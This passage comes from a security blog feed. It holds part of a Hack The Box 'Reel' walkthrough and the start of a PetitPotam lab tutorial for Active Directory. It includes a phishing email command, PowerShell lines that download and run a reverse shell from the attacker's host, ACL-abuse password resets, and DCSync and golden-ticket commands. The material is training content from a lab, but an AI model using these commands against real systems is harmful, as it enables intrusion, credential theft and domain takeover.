|     EHLO Invalid domain address.                                                                                
|   Help:                                                                                                         
|     220 Mail Service ready                                                                                      
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY              
|   SIPOptions:                                                                                                   
|     220 Mail Service ready                                                                                      
|     sequence of commands                                                                                        
|     sequence of commands
|     sequence of commands                              
|     sequence of commands
|     sequence of commands                                                                                        
|     sequence of commands                                                                                        
|     sequence of commands
|     sequence of commands                    
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</code></pre></div></div>

<h3 id="anonymous-ftp">Anonymous FTP</h3>
<p><em>Checking</em> <strong>FTP</strong>, we come across 3 files:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">Applocker.docx</code></li>
  <li><code class="language-plaintext highlighter-rouge">readme.txt</code></li>
  <li><code class="language-plaintext highlighter-rouge">Windows Event Forwarding.docx</code></li>
</ul>

<p><img src="/assets/Reel/ftp-listing.jpg" alt="ftp-listing" /></p>

<h3 id="contents-of-readmetxt">Contents of readme.txt</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
</code></pre></div></div>

<h3 id="looks-like-were-going-phishing-d">Looks like we’re going phishing :D</h3>
<p>the content is about someone asking to be emailed RTF formats (a type of document) for him/her to review and convert.</p>

<p>This seems like a <strong>Phishing Challenge</strong>. <em>In order to exploit,</em> we need to:</p>
<ol>
  <li>Find out who that user is</li>
  <li>Find a way to create a malicious RTF file</li>
  <li>Find a way to send an email using the open SMTP port</li>
</ol>

<h3 id="enumerating-smtp">Enumerating SMTP</h3>
<p>We use a tool called <code class="language-plaintext highlighter-rouge">smtp-user-enum</code> which lets us find if a given user exists or not.</p>

<p>It uses a couple of <strong>SMTP</strong> commands to do that:</p>
<ol>
  <li>VRFY</li>
  <li>EXPN</li>
  <li>RCPT</li>
</ol>

<p>we give it a list of male/female names from the <strong>SecLists</strong> Github Repo to try while we look at how to create a malicious document.</p>

<p><img src="/assets/Reel/male-female-wordlists.jpg" alt="male-female-wordlists" /></p>

<p>the command is:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smtp-user-enum <span class="nt">-M</span> VRFY <span class="nt">-U</span> users.txt <span class="nt">-t</span> 10.10.10.77
</code></pre></div></div>

<p>That takes a while to run. And it comes up short. <em>So we move on…</em></p>

<h3 id="checking-file-metadata-using-exiftool">Checking file metadata using <code class="language-plaintext highlighter-rouge">exiftool</code></h3>

<p>When we run <code class="language-plaintext highlighter-rouge">exiftool</code> against the <code class="language-plaintext highlighter-rouge">Windows Event Forwarding.docx</code> file, we do find a user called <code class="language-plaintext highlighter-rouge">nico</code> whose email is <code class="language-plaintext highlighter-rouge">nico@megabank.com</code></p>

<p><img src="/assets/Reel/exiftool-wef-doc.jpg" alt="exiftool-wef-doc" /></p>

<p>we note this down and go verify this user using <code class="language-plaintext highlighter-rouge">smtp-user-enum</code></p>

<h3 id="trying-various-smtp-methods-for-enumeration">Trying various SMTP methods for enumeration</h3>

<p><em>when testing mulitple methods with the</em> <code class="language-plaintext highlighter-rouge">nico</code> <em>user</em>, we still get no hits :/</p>

<p><em>However,</em> we do get a verification when add the <code class="language-plaintext highlighter-rouge">-D</code> flag and supply <code class="language-plaintext highlighter-rouge">megabank.com</code> as the domain.</p>

<p>But only with the <code class="language-plaintext highlighter-rouge">RCPT</code> method:</p>

<p><img src="/assets/Reel/nico-vrfy.jpg" alt="nico-vrfy" /></p>

<p><img src="/assets/Reel/nico-expn.jpg" alt="nico-expn" /></p>

<p><img src="/assets/Reel/nico-rcpt.jpg" alt="nico-rcpt" /></p>

<h3 id="working-on-the-phish">Working on the Phish</h3>

<p>Doing a <strong>Google</strong> search shows an article about <strong>CVE-2017-0199</strong> which looks promising.</p>

<p><img src="/assets/Reel/rtf-exploit-search.jpg" alt="rtf-exploit-search" /></p>

<p><em>According to the article,</em> we should clone a repo (https://github.com/bhdresh/CVE-2017-0199.git) to get a <strong>python</strong> script.</p>

<p>We look at the help:</p>

<p><img src="/assets/Reel/cve-2017-0199-python.jpg" alt="cve-2017-0199-python" /></p>

<p>We need to generate a malicious <code class="language-plaintext highlighter-rouge">RTF</code> document using the first mode <code class="language-plaintext highlighter-rouge">gen</code> and supply a url of an <code class="language-plaintext highlighter-rouge">HTA</code> file to achieve code execution.</p>

<p>Let’s first create the evil <code class="language-plaintext highlighter-rouge">HTA</code> file using <code class="language-plaintext highlighter-rouge">msfvenom</code></p>

<p><img src="/assets/Reel/evil-hta.jpg" alt="evil-hta" /></p>

<p>And create the evil <code class="language-plaintext highlighter-rouge">RTF</code> and call it <code class="language-plaintext highlighter-rouge">review.rtf</code> to look benign</p>

<p><img src="/assets/Reel/evil-rtf.jpg" alt="evil-rtf" /></p>

<p>We host the payload on our kali machine using a standard <code class="language-plaintext highlighter-rouge">python3</code> webserver and start our listener with <code class="language-plaintext highlighter-rouge">nc -lvnp</code> on port 9000</p>

<p><img src="/assets/Reel/hosted-payload.jpg" alt="hosted-payload" /></p>

<p>What’s left is to send the email to <code class="language-plaintext highlighter-rouge">nico@megabank.com</code></p>

<h3 id="sending-the-mail-and-some-deception-">Sending the mail and some deception ;)</h3>
<p>We’re going to use the <code class="language-plaintext highlighter-rouge">sendEmail</code> command with a couple flags:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">-t &lt;RECEPIENT&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">-f &lt;SENDER&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">-s &lt;SMTP_SERVER&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">-u &lt;MAIL_SUBJECT&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">-a &lt;PATH_TO_ATTACHMENT&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">-m &lt;MESSAGE_BODY&gt;</code></li>
</ul>

<p>Our command is:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sendEmail <span class="se">\</span>
<span class="nt">-t</span> nico@megabank.com <span class="se">\</span>
<span class="nt">-f</span> review@megabank.com <span class="se">\</span>
<span class="nt">-s</span> 10.10.10.77 <span class="se">\</span>
<span class="nt">-u</span> <span class="s1">'Document for Review'</span> <span class="se">\</span>
<span class="nt">-a</span> /opt/CVE-2017-0199/review.rtf <span class="se">\</span>
<span class="nt">-m</span> <span class="s1">'Kindly review the attached document. Just press OK if you get an error while opening it and it should be fine.'</span>
</code></pre></div></div>

<p>We try to look non-suspicous as possible. And use a subtle message in the body to have the user click ‘OK’ if he gets an error message (<em>which does happen with this exploit</em>).</p>

<p><img src="/assets/Reel/document-error-1.jpg" alt="document-error-1" /></p>

<p><img src="/assets/Reel/document-error-2.jpg" alt="document-error-2" /></p>

<h3 id="triggering-the-exploit-chain">Triggering the exploit chain</h3>
<p><em>Having everything ready,</em> we trigger the chain:</p>

<ol>
  <li>Send the malicious <code class="language-plaintext highlighter-rouge">RTF</code> file</li>
  <li>The <code class="language-plaintext highlighter-rouge">RTF</code> calls back to the <code class="language-plaintext highlighter-rouge">HTA</code> payload hosted on our kali machine</li>
  <li>The <code class="language-plaintext highlighter-rouge">HTA</code> file is executed and returns a shell on our listening host</li>
</ol>

<p><img src="/assets/Reel/exploit-chain.jpg" alt="exploit-chain" /></p>

<h3 id="brief-note-on-the-article-content">Brief note on the article content</h3>

<p>The guide talks about using an <code class="language-plaintext highlighter-rouge">exe</code> file. We cannot do so because of <code class="language-plaintext highlighter-rouge">Applocker</code>.</p>

<p>We know this because it was mentioned that the user has set up <code class="language-plaintext highlighter-rouge">Hash Rules</code> for multiple file types:</p>

<p><img src="/assets/Reel/Applocker-docx.jpg" alt="Applocker-docx" /></p>

<p>This is why we generated an <code class="language-plaintext highlighter-rouge">HTA</code> payload using <code class="language-plaintext highlighter-rouge">msfvenom</code> instead.</p>

<h3 id="domain-enumeration-using-sharphoundps1">Domain Enumeration using <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code></h3>

<p><em>Since running</em> <code class="language-plaintext highlighter-rouge">.exe</code> <em>is disabled by</em> <strong>Group Policy</strong>, we turn to <code class="language-plaintext highlighter-rouge">BloodHound</code>’s <strong>PowerShell ingestor</strong> (https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) and run the <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> method.</p>

<p><em>But before we can do that,</em> we need a <strong>PowerShell</strong> shell.</p>

<p>Switching to <strong>PowerShell</strong> from <strong>CMD</strong> can be done with the below command using the famous <strong>Nishang shell</strong> (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp</code> call at the bottom of the <code class="language-plaintext highlighter-rouge">.ps1</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="s2">"IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"</span>
</code></pre></div></div>

<p><em>To run the</em> <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> <em>method</em>, We import the <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> script into memory using the same we ran <code class="language-plaintext highlighter-rouge">Nishang.ps1</code>:</p>

<p><code class="language-plaintext highlighter-rouge">powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/SharpHound.ps1')"</code></p>

<h3 id="a-note-on-sharphoundps1-output">A note on <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> output:</h3>

<p><code class="language-plaintext highlighter-rouge">Sharphound.ps1</code> will generate version 3 <code class="language-plaintext highlighter-rouge">JSON</code> files. Those <em>will not be compatible</em> with the most recent version of <strong>BloodHound</strong> (currently it’s at 4).</p>

<p><img src="/assets/Reel/sharphound-ps1-json-version.jpg" alt="sharphound-ps1-json-version" /></p>

<p><em>To get it working,</em> we will need to get <code class="language-plaintext highlighter-rouge">BloodHound</code> version 3 from the <strong>Official Releases Page</strong> (https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.3)</p>

<h3 id="investigating-possible-exploit-paths">Investigating Possible Exploit Paths</h3>

<p><em>Upon looking at</em> <code class="language-plaintext highlighter-rouge">BloodHound</code>’s <em>output,</em> we notice that <code class="language-plaintext highlighter-rouge">nico</code> can set the <code class="language-plaintext highlighter-rouge">owner</code> for user <code class="language-plaintext highlighter-rouge">herman</code></p>

<p><img src="/assets/Reel/nico-can-write-owner.jpg" alt="nico-can-write-owner" /></p>

<p><em>Simulating having owned the user</em> <code class="language-plaintext highlighter-rouge">herman</code>, we notice we can reach the <code class="language-plaintext highlighter-rouge">backup_admins</code> group.</p>

<p>This is because the <code class="language-plaintext highlighter-rouge">herman</code> user has a <code class="language-plaintext highlighter-rouge">WriteDACL</code> right over it.</p>

<p><img src="/assets/Reel/herman-has-write-dacl.jpg" alt="herman-has-write-dacl" /></p>

<h3 id="abusing-nicos-writeowner-right-over-herman">Abusing <code class="language-plaintext highlighter-rouge">nico</code>’s <code class="language-plaintext highlighter-rouge">WriteOwner</code> right over <code class="language-plaintext highlighter-rouge">herman</code></h3>

<p><em>Checking the help for the</em> <code class="language-plaintext highlighter-rouge">WriteOwner</code> <em>right</em>, we notice we can use <code class="language-plaintext highlighter-rouge">PowerView</code>’s <code class="language-plaintext highlighter-rouge">Set-DomainObjectOwner</code> function.</p>

<p><img src="/assets/Reel/set-dom-obj-owner.jpg" alt="set-dom-obj-owner" /></p>

<p><strong>Command:</strong></p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainObjectOwner</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-OwnerIdentity</span><span class="w"> </span><span class="nx">nico</span><span class="w">
</span></code></pre></div></div>

<p>We will need to follow up with:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">nico</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">ResetPassword</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/Reel/add-dom-object-acl.jpg" alt="add-dom-object-acl" /></p>

<p>And set the password for <code class="language-plaintext highlighter-rouge">herman</code> using <code class="language-plaintext highlighter-rouge">Set-DomainUserPassword</code></p>

<p><img src="/assets/Reel/Set-dom-user-pwd.jpg" alt="Set-dom-user-pwd" /></p>

<p>We create a <code class="language-plaintext highlighter-rouge">secure string</code> object using:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$UserPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span></code></pre></div></div>

<p>and set the password:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$UserPassword</span><span class="w">
</span></code></pre></div></div>

<h3 id="logging-in-as-herman-and-joining-the-backup_admins-group">Logging in as herman and joining the <code class="language-plaintext highlighter-rouge">backup_admins</code> group</h3>

<p><em>After resetting the password for</em> <code class="language-plaintext highlighter-rouge">herman</code>, we’re able to login via the open <code class="language-plaintext highlighter-rouge">SSH</code> port:</p>

<p><img src="/assets/Reel/ssh-as-herman.jpg" alt="ssh-as-herman" /></p>

<p>and we can add ourselves to the <code class="language-plaintext highlighter-rouge">backup_admins</code> group easily with <code class="language-plaintext highlighter-rouge">Add-ADGroupMember 'backup_admins' -members herman</code></p>

<p><img src="/assets/Reel/joining-backup-admins.jpg" alt="joining-backup-admins" /></p>

<h3 id="file-system-access-with-backup_adminss-group-membership">File System access with <code class="language-plaintext highlighter-rouge">backup_admins</code>’s group membership</h3>

<p>We first <em>relog</em> to <em>refresh our access</em> and check our newly-found acccess using <code class="language-plaintext highlighter-rouge">PowerShell</code>:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'silentlycontinue'</span><span class="w">
</span><span class="n">ls</span><span class="w"> </span><span class="nt">-recurse</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="o">-notmatch</span><span class="w"> </span><span class="s1">'AppData|Application Data|Local Settings'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{(</span><span class="n">get-acl</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="nf">accesstostring</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'*Backup_admins*'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-expand</span><span class="w"> </span><span class="nx">fullname</span><span class="w">
</span><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'continue'</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/Reel/file-access-as-backup-admins.jpg" alt="file-access-as-backup-admins" /></p>

<p>The output suggests we should check out the files in the <code class="language-plaintext highlighter-rouge">Backup Scripts</code> folder.</p>

<p>Checking the <code class="language-plaintext highlighter-rouge">BackupScript.ps1</code> shows a password:</p>

<p><img src="/assets/Reel/backscript-password.jpg" alt="backscript-password" /></p>

<p>Using the password <code class="language-plaintext highlighter-rouge">Cr4ckMeIfYouC4n!</code> works with the administrator user over <code class="language-plaintext highlighter-rouge">SSH</code>:</p>

<p><img src="/assets/Reel/got-admin-path-1.jpg" alt="got-admin-path-1" /></p>

<h3 id="exploit-path-2-nico---tom---claire--backup_admins">Exploit Path #2: <code class="language-plaintext highlighter-rouge">nico</code> -&gt; <code class="language-plaintext highlighter-rouge">tom</code> -&gt; <code class="language-plaintext highlighter-rouge">claire</code> &gt; <code class="language-plaintext highlighter-rouge">backup_admins</code></h3>

<p>On <code class="language-plaintext highlighter-rouge">nico</code>’s desktop we find a file called <code class="language-plaintext highlighter-rouge">cred.xml</code></p>

<p><img src="/assets/Reel/nico-cred-xml.jpg" alt="nico-cred-xml" /></p>

<p><em>looking at its contents,</em> we recognize it’s a <strong>PowerShell Credential Object</strong> that has the username and password of <code class="language-plaintext highlighter-rouge">tom</code></p>

<p><img src="/assets/Reel/ps-cred-object.jpg" alt="ps-cred-object" /></p>

<p>A <strong>PowerShell Credential Object</strong> is used to execute commands <em>using a different set of creds</em> than that of the current user.</p>

<p><em>Without having the password,</em> we can import the credential object using <code class="language-plaintext highlighter-rouge">Import-Clixml</code> cmdlet and use it with the PowerShell <code class="language-plaintext highlighter-rouge">Start-Job</code> cmdlet to launch a <code class="language-plaintext highlighter-rouge">nishang</code> shell as <code class="language-plaintext highlighter-rouge">tom</code></p>

<p><img src="/assets/Reel/cred-to-tom.jpg" alt="cred-to-tom" /></p>

<p>We can also retrieve the plain text password by using the <code class="language-plaintext highlighter-rouge">GetNetworkCredential</code> method of the <code class="language-plaintext highlighter-rouge">System.Management.Automation.PSCredential</code> class:</p>

<p><img src="/assets/Reel/get-network-cred-method.jpg" alt="get-network-cred-method" /></p>

<p><img src="/assets/Reel/toms-password.jpg" alt="toms-password" /></p>

<p>The password works for <code class="language-plaintext highlighter-rouge">tom</code> using <code class="language-plaintext highlighter-rouge">SSH</code></p>

<p><img src="/assets/Reel/tom-ssh.jpg" alt="tom-ssh" /></p>

<p><em>Looking at the exploit path from</em> <code class="language-plaintext highlighter-rouge">tom</code> <em>using</em> <code class="language-plaintext highlighter-rouge">bloodhound</code>, shows the same path like <code class="language-plaintext highlighter-rouge">nico</code></p>

<p><img src="/assets/Reel/tom-owner-claire.jpg" alt="tom-owner-claire" /></p>

<p><img src="/assets/Reel/claire-to-backup-admins.jpg" alt="claire-to-backup-admins" /></p>

<h3 id="exploit-path-3-metasploitation">Exploit Path #3: Metasploitation</h3>

<p>The same exploit for <strong>CVE-2017-0199</strong> exists in a <strong>Metasploit Module</strong> (<code class="language-plaintext highlighter-rouge">windows/fileformat/office_word_hta</code>) when we search using the <code class="language-plaintext highlighter-rouge">rtf</code> keyword:</p>

<p><img src="/assets/Reel/metasploit-rtf-exploit.jpg" alt="metasploit-rtf-exploit" /></p>

<p>setting the options is <strong>critical</strong> here!</p>

<p>We have to set the <code class="language-plaintext highlighter-rouge">SRVHOST</code> option or else it would create the document and embed our <code class="language-plaintext highlighter-rouge">eth0</code> IP address into the document (<em>Troubleshooting this part took me a while</em>).</p>

<p><img src="/assets/Reel/setting-options-msf-exploit.jpg" alt="setting-options-msf-exploit" /></p>

<p>We can send the <code class="language-plaintext highlighter-rouge">doc</code> file to the victim and he would still open it (<em>I didn’t realise this at first and used a</em> <code class="language-plaintext highlighter-rouge">.DOC</code> <em>to</em> <code class="language-plaintext highlighter-rouge">.RTF</code> <em>converter</em>).</p>

<p><img src="/assets/Reel/msf-doc.jpg" alt="msf-doc" /></p>

<p><img src="/assets/Reel/got-meterpreter.jpg" alt="got-meterpreter" /></p>

<p>We will then use <code class="language-plaintext highlighter-rouge">Metasploit</code>’s <code class="language-plaintext highlighter-rouge">local exploit suggester</code> <em>after migrating to a 64-bit process.</em></p>

<p><img src="/assets/Reel/x86-meterpreter.jpg" alt="x86-meterpreter" /></p>

<p><img src="/assets/Reel/migrating-to-64-meterpreter.jpg" alt="migrating-to-64-meterpreter" /></p>

<p>The module finds the host to be <em>vulnerable</em> to <code class="language-plaintext highlighter-rouge">CVE-2019-1458</code> also know as <strong>Wizard Opium</strong>.</p>

<p><img src="/assets/Reel/msf-exp-suggester.jpg" alt="msf-exp-suggester" /></p>

<p>which works like a charm XD</p>

<p><img src="/assets/Reel/wizard-opium-works.jpg" alt="wizard-opium-works" /></p>

<p>another exploit that worked is <code class="language-plaintext highlighter-rouge">CVE-2018-8440</code></p>

<p><img src="/assets/Reel/msf-alpc-privesc.jpg" alt="msf-alpc-privesc" /></p>

<p>Of course these paths are not intended because it’s just using <code class="language-plaintext highlighter-rouge">MetaSploit</code></p>

<h3 id="exploit-path-4-incomplete-abusing-seloaddriverprivilege">Exploit Path #4 (Incomplete): Abusing <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code></h3>

<p>The <code class="language-plaintext highlighter-rouge">tom</code> user is a member of the <code class="language-plaintext highlighter-rouge">Print Operators</code> Group which hold the <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code></p>

<p><img src="/assets/Reel/print-ops-and-load-driver.jpg" alt="print-ops-and-load-driver" /></p>

<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - PetitPotam</title><link href="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - PetitPotam" /><published>2022-04-28T00:00:00+02:00</published><updated>2022-04-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/28/PetitPotam</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html"><![CDATA[<h1 id="introduction--attack-anatomy">Introduction &amp; Attack Anatomy</h1>

<p><img src="/assets/petitpotam/Petit-Potam-Flow-Diagram.jpg" alt="Petit-Potam-Flow-Diagram" /></p>

<ul>
  <li>The <strong>PetitPotam attack</strong> is a technique where we abuse the <strong>printer bug</strong> (Explained here: https://www.fortalicesolutions.com/posts/elevating-with-ntlmv1-and-the-printer-bug) to make a <strong>domain controller</strong> authenticate to our <strong>kali machine</strong>.</li>
  <li><em>Relaying the captured authentication</em> to the <strong>web interface of AD Certificate services (ADCS)</strong> allows us to get the <strong>certificate of the domain controller’s computer account</strong>.</li>
  <li><em>Having this certificate</em> can let us <strong>request a TGT for the computer account</strong>.</li>
  <li><em>And, with a TGT of a Domain Controller’s machine account,</em> we can abuse its <strong>DCSync</strong> right on the domain to retrieve <strong>a full dump containing all domain users’ NTLM hashes</strong>.</li>
  <li><em>Having all user hashes and using them with a simple Pass-the-Hash attack,</em> we can obtain <strong>code execution as a Domain Admin</strong>.</li>
  <li><strong>Persistence</strong> can also be established with a <strong>Golden Ticket</strong> since the <code class="language-plaintext highlighter-rouge">krbtgt</code> account hash would be obtainable.</li>
</ul>

<hr />

<h1 id="tools-needed">Tools needed</h1>
<ol>
  <li><strong>Impacket</strong> (https://github.com/SecureAuthCorp/impacket)</li>
  <li><strong>PetitPotam</strong> (https://github.com/topotam/PetitPotam)</li>
  <li><strong>Rubeus</strong> (https://github.com/GhostPack/Rubeus)</li>
  <li><strong>Mimikatz</strong> (https://github.com/gentilkiwi/mimikatz)</li>
</ol>

<hr />

<h1 id="lab-setup-and-conditions">Lab Setup and Conditions</h1>
<h2 id="1-dclablocal-192168126129">1. DC.lab.local (192.168.126.129)</h2>
<p>A Domain Controller with <strong>Active Directory Certificate Services Web Enrollment</strong> enabled</p>

<p><img src="/assets/petitpotam/Domain-Controllers.jpg" alt="Domain-Controllers" /></p>

<p><img src="/assets/petitpotam/AD-CS-Installed.jpg" alt="AD-CS-Installed" /></p>

<h2 id="2-dc2lablocal-192168126130">2. DC2.lab.local (192.168.126.130)</h2>
<p>Another Domain Controller (<em>PrintSpooler Service must be running to quickly force authentication.</em>)</p>

<p><img src="/assets/petitpotam/Spooler-Running.jpg" alt="Spooler-Running" /></p>

<h2 id="3-kali-machine-192168126132">3. Kali Machine (192.168.126.132)</h2>
<p>for triggering authentication and relaying to ADCS Web UI.</p>

<p><img src="/assets/petitpotam/kali-ip-config.jpg" alt="kali-ip-config" /></p>

<h2 id="4-windows-machine-192168126128">4. Windows Machine (192.168.126.128)</h2>
<p>for requesting a TGT and doing the DCSync attack (The machine shouldn’t be in the domain, but should have the Domain Controller set as its primary DNS server).</p>

<p><img src="/assets/petitpotam/Windows-Attacker-ipconfig.jpg" alt="Windows-Attacker-ipconfig" /></p>

<h2 id="5-normal-user-account-labjohnsmith">5. normal user account (Lab\JohnSmith)</h2>
<p>A regular domain user with no special privileges.</p>

<p><img src="/assets/petitpotam/John-Smith-User.jpg" alt="John-Smith-User" /></p>

<hr />

<h1 id="steps-to-create">Steps to Create</h1>
<h2 id="1-set-up-ntlm-relay-on-our-attacker-host-to-forward-the-captured-authentication-to-adcs-web-ui">1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py <span class="nt">-t</span> http://&lt;CA_Server&gt;/certsrv/certfnsh.asp <span class="nt">-smb2support</span> <span class="nt">--adcs</span> <span class="nt">--template</span> DomainController
</code></pre></div></div>

<p><img src="/assets/petitpotam/ntlm-relay-start.jpg" alt="ntlm-relay-start" /></p>

<h2 id="2-use-petitpotam-to-force-authentication-from-a-domain-controller-back-to-the-relaying-kali-machine">2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 PetitPotam.py <span class="nt">-d</span> &lt;DOMAIN_FQDN&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; &lt;KALI&gt; &lt;TARGET_DC&gt;
</code></pre></div></div>

<p><img src="/assets/petitpotam/PetitPotam-Launched.jpg" alt="PetitPotam-Launched" /></p>

<h2 id="3-recieve-the-base64-certificate-for-the-domain-controllers-computer-account">3. Recieve the Base64 certificate for the domain controller’s computer account</h2>

<p><img src="/assets/petitpotam/got-dc2-cert.jpg" alt="got-dc2-cert" /></p>

<h2 id="4-use-rubeus-on-the-windows-machine-to-request-a-tgt-for-that-account-using-the-certificate">4. Use Rubeus on the windows machine to request a TGT for that account using the certificate</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe asktgt /outfile:kirbi /dc:&lt;DOMAINCONTROLLER&gt; /domain:&lt;DOMAIN_FQDN&gt; /user:&lt;CAPTURED_DC_COMPUTER_ACCOUNT_NAME&gt; /ptt /certificate:&lt;CAPTURED_BASE64_CERTIFICATE&gt;
</code></pre></div></div>

<p><img src="/assets/petitpotam/rubeus-command.jpg" alt="rubeus-command" /></p>

<p><img src="/assets/petitpotam/got-dc2-tgt.jpg" alt="got-dc2-tgt" /></p>

<h2 id="5-having-the-tgt-in-memory-use-mimikatz-to-do-a-dcsync-attack">5. <em>Having the TGT in memory,</em> use Mimikatz to do a DCSync attack</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcsync /domain:&lt;DOMAINFQDN&gt; /user:&lt;TARGET_USER&gt;
</code></pre></div></div>

<p><img src="/assets/petitpotam/dcsync-for-domain-admin-hash.jpg" alt="dcsync-for-domain-admin-hash" /></p>

<h2 id="6-grab-any-domain-admins-hash-to-have-code-execution">6. Grab any domain admin’s hash to have code execution</h2>

<p><img src="/assets/petitpotam/code-execution-as-administrator.jpg" alt="code-execution-as-administrator" /></p>

<h2 id="7-optional-create-a-golden-ticket-for-persistence">7. (Optional) Create a Golden Ticket for persistence</h2>
<p>Domain SID Lookup:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lookupsid.py &lt;DOMAIN_FQDN&gt;/&lt;USERNAME&gt;@&lt;DC_IP&gt;
</code></pre></div></div>

<p><img src="/assets/petitpotam/domain-sid-lookup.jpg" alt="domain-sid-lookup" /></p>

<p>Obtaining the <code class="language-plaintext highlighter-rouge">krbtgt</code> account’s hash:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcsync /domain:&lt;DOMAIN_FQDN&gt; /user:krbtgt
</code></pre></div></div>

<p><img src="/assets/petitpotam/krbtgt-hash.jpg" alt="krbtgt-hash" /></p>

<p>Golden ticket creation:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ticketer.py <span class="nt">-nthash</span> &lt;KRBTGT_HASH&gt; <span class="nt">-domain-sid</span> &lt;DOMAIN_SID&gt; <span class="nt">-domain</span> &lt;DOMAIN_FQDN&gt; &lt;CAN_BE_NON_EXISTING_USERNAME&gt;
</code></pre></div></div>

<p><img src="/assets/petitpotam/golden-ticket-created.jpg" alt="golden-ticket-created" /></p>

<p>Exporting ticket to the environment:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/&lt;CHOSEN_USERNAME&gt;.ccache
</code></pre></div></div>

<p>Command execution using ticket:</p>
